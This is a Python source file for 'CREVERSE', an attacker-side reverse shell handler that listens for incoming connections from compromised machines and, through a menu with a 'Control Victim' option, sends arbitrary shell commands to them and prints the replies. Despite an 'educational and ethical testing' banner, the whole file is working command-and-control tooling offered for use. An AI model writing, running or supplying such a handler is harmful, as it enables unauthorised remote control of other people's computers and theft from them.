#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import os
import sys
import json
from datetime import datetime
import subprocess

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class ReverseShellHandler:
    def __init__(self):
        self.connections = {}
        self.active_connections = 0
        self.server_socket = None
        self.is_running = False
        
    def print_banner(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                     CREVERSE                                 ║
║                                                              ║
║  Reverse Shell Handler - Advanced Connection Manager         ║
║                                                              ║
║    For Educational and Ethical Testing Purposes Only         ║
║                                                              ║
║   Author: AymanCsharp                                        ║
║   Version: 2.0                                               ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.CYAN}{Colors.BOLD}╔═════════════════════════════════════
║                        MAIN MENU                             ║
╠══════════════════════════════════════════════════════════════╣
║  [1] Start Listening                                         ║
║  [2] Show Active Connections                                 ║
║  [3] Control Victim                                          ║
║  [4] Event Log                                               ║
║  [5] Stop Server                                             ║
║  [6] Exit                                                    ║
╚══════════════════════════════════════════════════════════════╝{Colors.END}
"""
        print(menu)
    
    def get_user_input(self):
        print(f"\n{Colors.YELLOW}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    SERVER CONFIGURATION                      ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        while True:
            try:
                host = input(f"{Colors.GREEN}[+] Enter IP address: {Colors.END}").strip()
                if not host:
                    host = "0.0.0.0"
                
                port = input(f"{Colors.GREEN}[+] Enter port number: {Colors.END}").strip()
                port = int(port)
                
                if 1 <= port <= 65535:
                    return host, port
                else:
                    print(f"{Colors.RED}[!] Port number must be between 1 and 65535{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}[!] Enter a valid port number{Colors.END}")
    
    def start_server(self, host, port):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((host, port))
            self.server_socket.listen(5)
            self.is_running = True
            
            print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════════════════╗")
            print(f"║                    SERVER IS RUNNING                                         ║")
            print(f"║                                                                              ║")
            print(f"║  Address: {host:<47}                                                         ║")
            print(f"║  Port: {port:<48}                                                            ║")
            print(f"║  Waiting for connections...                                                  ║")
            print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
            
            listen_thread = threading.Thread(target=self.listen_for_connections, args=(host, port))
            listen_thread.daemon = True
            listen_thread.start()
            
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error starting server: {e}{Colors.END}")
            return False
    
    def listen_for_connections(self, host, port):
        while self.is_running:
            try:
                client_socket, address = self.server_socket.accept()
                self.handle_new_connection(client_socket, address)
            except:
                if self.is_running:
                    break
    
    def handle_new_connection(self, client_socket, address):
        connection_id = f"conn_{len(self.connections) + 1}"
        self.connections[connection_id] = {
            'socket': client_socket,
            'address': address,
            'connected_at': datetime.now(),
            'last_activity': datetime.now()
        }
        self.active_connections += 1
        
        print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    NEW CONNECTION!                                           ║")
        print(f"║                                                                              ║")
        print(f"║  Connection ID: {connection_id:<40}                                          ║")
        print(f"║  Address: {address[0]:<47}                                                   ║")
        print(f"║  Port: {address[1]:<48}                                                      ║")
        print(f"║  Time: {datetime.now().strftime('%H:%M:%S'):<42}                             ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        client_thread = threading.Thread(target=self.handle_client, args=(connection_id,))
        client_thread.daemon = True
        client_thread.start()
    
    def handle_client(self, connection_id):
        if connection_id not in self.connections:
            return
            
        client_info = self.connections[connection_id]
        client_socket = client_info['socket']
        
        try:
            while self.is_running:
                command = input(f"\n{Colors.CYAN}[{connection_id}] shell> {Colors.END}")
                
                if command.lower() in ['quit', 'exit', 'disconnect']:
                    break
                
                if command.strip():
                    try:
                        client_socket.send(command.encode())
                        response = client_socket.recv(4096).decode()
                        if response:
                            print(f"\n{Colors.YELLOW}Response:{Colors.END}")
                            print(f"{Colors.WHITE}{response}{Colors.END}")
                        client_info['last_activity'] = datetime.now()
                    except:
                        print(f"{Colors.RED}[!] Connection failed{Colors.END}")
                        break
                        
        except Exception as e:
            print(f"{Colors.RED}[!] Error handling client: {e}{Colors.END}")
        finally:
            self.close_connection(connection_id)
    
    def close_connection(self, connection_id):
        if connection_id in self.connections:
            try:
                self.connections[connection_id]['socket'].close()
            except:
                pass
            del self.connections[connection_id]
            self.active_connections -= 1
            
            print(f"\n{Colors.RED}╔══════════════════════════════════════════════════════════════╗")
            print(f"║                    CONNECTION CLOSED                                       ║")
            print(f"║                                                                            ║")
            print(f"║  Connection ID: {connection_id:<40}                                        ║")
            print(f"║  Active Connections: {self.active_connections:<38}                         ║")
            print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
    
    def show_connections(self):
        if not self.connections:
            print(f"\n{Colors.YELLOW}[!] No active connections{Colors.END}")
            return
            
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    ACTIVE CONNECTIONS                                       ║")
        print(f"╠═════════════════════════════════════════════════════════════════            ╣")
        print(f"║  ID         ADDRESS         PORT       CONNECTION TIME                      ║")
        print(f"╠═════════════════════════════════════════════════════════════════            ╣")
        
        for conn_id, conn_info in self.connections.items():
            address = conn_info['address']
            connected_at = conn_info['connected_at'].strftime('%H:%M:%S')
            print(f"║  {conn_id:<8} {address[0]:<15} {address[1]:<10} {connected_at:<15} ║")
        
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        print(f"\n{Colors.GREEN}Total Active Connections: {self.active_connections}{Colors.END}")
    
    def control_victim(self):
        if not self.connections:
            print(f"\n{Colors.YELLOW}[!] No active connections to control{Colors.END}")
            return
            
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    VICTIM CONTROL                            ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        print(f"\n{Colors.YELLOW}Available connections:{Colors.END}")
        for conn_id in self.connections.keys():
            print(f"  - {conn_id}")
        
        conn_id = input(f"\n{Colors.GREEN}Enter connection ID: {Colors.END}").strip()
        
        if conn_id in self.connections:
            print(f"\n{Colors.GREEN}[+] Connected to {conn_id}{Colors.END}")
            print(f"{Colors.YELLOW}Type 'back' to return to main menu{Colors.END}")
            
            while True:
                command = input(f"\n{Colors.CYAN}[{conn_id}] control> {Colors.END}")
                
                if command.lower() == 'back':
                    break
                    
                if command.strip():
                    try:
                        client_socket = self.connections[conn_id]['socket']
                        client_socket.send(command.encode())
                        response = client_socket.recv(4096).decode()
                        if response:
                            print(f"\n{Colors.YELLOW}Response:{Colors.END}")
                            print(f"{Colors.WHITE}{response}{Colors.END}")
                    except:
                        print(f"{Colors.RED}[!] Connection failed{Colors.END}")
                        break
        else:
            print(f"{Colors.RED}[!] Invalid connection ID{Colors.END}")
    
    def show_event_log(self):
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    EVENT LOG                                 ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        if not self.connections:
            print(f"\n{Colors.YELLOW}[!] No events recorded{Colors.END}")
            return
            
        for conn_id, conn_info in self.connections.items():
            print(f"\n{Colors.GREEN}Connection {conn_id}:{Colors.END}")
            print(f"  Address: {conn_info['address'][0]}:{conn_info['address'][1]}")
            print(f"  Connected: {conn_info['connected_at']}")
            print(f"  Last Activity: {conn_info['last_activity']}")
    
    def stop_server(self):
        if self.server_socket:
            self.is_running = False
            
            for conn_id in list(self.connections.keys()):
                self.close_connection(conn_id)
            
            try:
                self.server_socket.close()
            except:
                pass
            
            print(f"\n{Colors.RED}╔══════════════════════════════════════════════════════════════╗")
            print(f"              ║                    SERVER STOPPED                            ║")
            print(f"              ╚══════════════════════════════════════════════════════════════╝{Colors.END}")
    
    def run(self):
        self.print_banner()
        
        while True:
            self.print_menu()
            choice = input(f"\n{Colors.GREEN}Enter your choice: {Colors.END}").strip()
            
            if choice == '1':
                if not self.is_running:
                    host, port = self.get_user_input()
                    self.start_server(host, port)
                else:
                    print(f"{Colors.YELLOW}[!] Server is already running{Colors.END}")
                    
            elif choice == '2':
                self.show_connections()
                
            elif choice == '3':
                self.control_victim()
                
            elif choice == '4':
                self.show_event_log()
                
            elif choice == '5':
                if self.is_running:
                    self.stop_server()
                else:
                    print(f"{Colors.YELLOW}[!] Server is already stopped{Colors.END}")
                    
            elif choice == '6':
                if self.is_running:
                    self.stop_server()
                print(f"\n{Colors.GREEN}Thanks for using Creverse! {Colors.END}")
                break
                
            else:
                print(f"{Colors.RED}[!] Invalid choice{Colors.END}")
            
            input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")

def main():
    try:
        handler = ReverseShellHandler()
        handler.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Program stopped by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {e}{Colors.END}")

if __name__ == "__main__":
    main()
